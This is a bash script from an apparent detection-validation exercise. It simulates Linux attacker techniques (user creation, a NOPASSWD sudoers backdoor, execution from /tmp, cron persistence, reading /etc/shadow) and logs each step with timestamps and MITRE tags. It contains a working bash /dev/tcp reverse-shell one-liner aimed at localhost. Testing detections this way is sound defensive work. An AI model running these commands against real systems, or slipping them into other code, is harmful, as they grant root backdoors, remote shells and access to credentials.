#!/bin/bash
#
# 11-linux_attack_sim.sh
#
# MedDefense Health Systems - Eyes on the Endpoint (2x02), Task 11.
#
# The Linux counterpart to 9-windows_attack_sim.ps1: the same validation
# methodology, the Crimson Tide advisory's Linux-specific techniques -
# create a user, modify sudoers, execute from /tmp, attempt a reverse
# shell (to localhost, safe), establish cron persistence, access
# /etc/shadow. Every action is timestamped precisely as it runs, so
# 12-linux_detection_proof.sh can later prove which auditd/auth.log/
# syslog source actually caught it.
#
# Makes real, but fully cleaned-up, changes: a local user account, a
# sudoers.d file, a /tmp binary, a cron.d file. A trap on EXIT guarantees
# cleanup runs even if a step fails partway through - this project never
# leaves a passwordless-sudo backdoor account behind because one command
# in the middle of the sequence errored.
#
# Usage: sudo ./11-linux_attack_sim.sh

set -euo pipefail

USERNAME="${USERNAME:-testattacker}"
SUDOERS_FILE="/etc/sudoers.d/backdoor"
SUSPICIOUS_BIN="/tmp/suspicious_bin"
CRON_FILE="/etc/cron.d/persistence_test"
GROUND_TRUTH_PATH="${1:-linux_attack_log.json}"

if [ "$(id -u)" -ne 0 ]; then
    echo "Error: this script must run as root - it creates a user, writes to sudoers.d and cron.d, and reads /etc/shadow" >&2
    exit 1
fi

cleanup() {
    userdel -f "$USERNAME" >/dev/null 2>&1 || true
    rm -f "$SUDOERS_FILE" 2>/dev/null || true
    rm -f "$SUSPICIOUS_BIN" 2>/dev/null || true
    rm -f "$CRON_FILE" 2>/dev/null || true
}
trap cleanup EXIT

ACTIONS_JSONL=""

# add_action <number> <description> <timestamp> <expected_source> <expected_key> <mitre_technique>:
# records the action number, exact timestamp, expected detection source/
# audit key, and MITRE ATT&CK technique for one ground-truth entry.
add_action() {
    local obj
    obj=$(jq -n --argjson num "$1" --arg desc "$2" --arg ts "$3" --arg source "$4" --arg key "$5" --arg mitre "$6" \
        '{action_number: $num, description: $desc, timestamp: $ts,
          expected_detection_source: { source: $source, audit_key: $key },
          mitre_attack_technique: $mitre}')
    ACTIONS_JSONL="${ACTIONS_JSONL}${obj}"$'\n'
}

now_iso() { date -u +%Y-%m-%dT%H:%M:%SZ; }

echo "[*] Running Linux attacker simulation..."

# --- 1/6: Create a user -------------------------------------------------------------------------
echo "    [1/6] Creating user $USERNAME..."
useradd -M -N -s /usr/sbin/nologin "$USERNAME" 2>/dev/null || true
TS1="$(now_iso)"
echo "          $TS1"
add_action 1 "Creating user $USERNAME" "$TS1" "auditd" "identity" "T1136.001"

# --- 2/6: Modify sudoers -------------------------------------------------------------------------
echo "    [2/6] Modifying sudoers..."
echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE" 2>/dev/null || true
chmod 440 "$SUDOERS_FILE" 2>/dev/null || true
TS2="$(now_iso)"
echo "          $TS2"
add_action 2 "Modifying sudoers via $SUDOERS_FILE" "$TS2" "auditd" "sudoers_d" "T1548.003"

# --- 3/6: Execute a binary from /tmp --------------------------------------------------------------
echo "    [3/6] Executing from /tmp..."
cp /usr/bin/id "$SUSPICIOUS_BIN" 2>/dev/null || true
"$SUSPICIOUS_BIN" >/dev/null 2>&1 || true
TS3="$(now_iso)"
echo "          $TS3"
add_action 3 "Executing $SUSPICIOUS_BIN (copy of /usr/bin/id)" "$TS3" "auditd" "process_exec" "T1059"

# --- 4/6: Attempt a reverse shell to localhost (safe - immediately killed) -------------------------
echo "    [4/6] Reverse shell attempt (localhost)..."
# Safe by construction: the target is 127.0.0.1, nothing is listening on
# 4444 unless deliberately set up, and the backgrounded shell is killed a
# second later regardless of whether the connection succeeded.
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &' 2>/dev/null || true
sleep 1
kill %1 2>/dev/null || true
TS4="$(now_iso)"
echo "          $TS4"
add_action 4 "Reverse shell attempt to 127.0.0.1:4444" "$TS4" "auditd" "network_connect" "T1071"

# --- 5/6: Modify crontab (cron persistence) --------------------------------------------------------
echo "    [5/6] Cron persistence..."
echo "* * * * * root /tmp/beacon.sh" > "$CRON_FILE" 2>/dev/null || true
TS5="$(now_iso)"
echo "          $TS5"
# /etc/cron.d/ is watched under 2x00 Task 10's "cron_config" key, not
# 2x02 Task 5's "cron_persist" (which only covers /var/spool/cron/ - the
# kernel audit subsystem only tags a matching event with one key when two
# separate -w rules cover the identical path, so this write is only ever
# going to surface under whichever rule claimed /etc/cron.d/ first).
add_action 5 "Cron persistence via $CRON_FILE" "$TS5" "auditd" "cron_config" "T1053.003"

# --- 6/6: Access sensitive files (/etc/shadow) -------------------------------------------------------
# 12-linux_detection_proof.sh searches +/-30s around each action, and
# Action 1 (useradd) also carries the "identity" key - if Action 6 ran
# right after it like the other actions do, its window would overlap
# Action 1's genuine event and falsely report a "capture" that's really
# just picking up the unrelated useradd write next door. The 65s pause
# (>60s = 2x the search window) guarantees the two windows never touch,
# so this action's result reflects only its own read, not its neighbor's.
sleep 65
echo "    [6/6] Accessing /etc/shadow..."
cat /etc/shadow > /dev/null 2>&1 || true
TS6="$(now_iso)"
echo "          $TS6"
# Note: 2x00 Task 10's identity rule watches /etc/shadow with -p wa (write
# and attribute-change only) - a plain read like this does NOT trigger it.
# The expected source/key below is what SHOULD catch credential access;
# 12-linux_detection_proof.sh is expected to honestly report this one as
# MISSED unless the rule is later broadened to -p rwa, which is itself a
# real, useful finding for 14-coverage_assessment.sh to surface.
add_action 6 "Reading /etc/shadow" "$TS6" "auditd" "identity" "T1003.008"

# --- Save ground truth (cleanup below runs unconditionally via the EXIT trap regardless) -------------
ACTIONS_JSON=$(jq -s '.' <<<"$ACTIONS_JSONL")
jq -n --argjson actions "$ACTIONS_JSON" --arg generated "$(now_iso)" \
    '{generated: $generated, actions_total: ($actions | length), actions: $actions}' \
    > "$GROUND_TRUTH_PATH"

echo "[*] Cleaning up artifacts..."
# Same reasoning as the pre-Action-6 delay above: cleanup's own userdel
# also carries the "identity" key. Running it right away would land
# inside Action 6's own +30s forward-looking search window, making the
# cleanup event itself look like a (false) detection of the shadow read.
sleep 35
CLEANUP_STATUS_FILE="$(mktemp)"
{ cleanup && echo "ok" > "$CLEANUP_STATUS_FILE"; } || echo "warn" > "$CLEANUP_STATUS_FILE"
trap - EXIT

if [ "$(cat "$CLEANUP_STATUS_FILE")" = "ok" ]; then
    echo "                                                        [CLEAN]"
else
    echo "                                                        [WARN - review manually]"
fi
rm -f "$CLEANUP_STATUS_FILE"

echo "Actions executed: 6"
echo "Ground truth saved to: $GROUND_TRUTH_PATH"
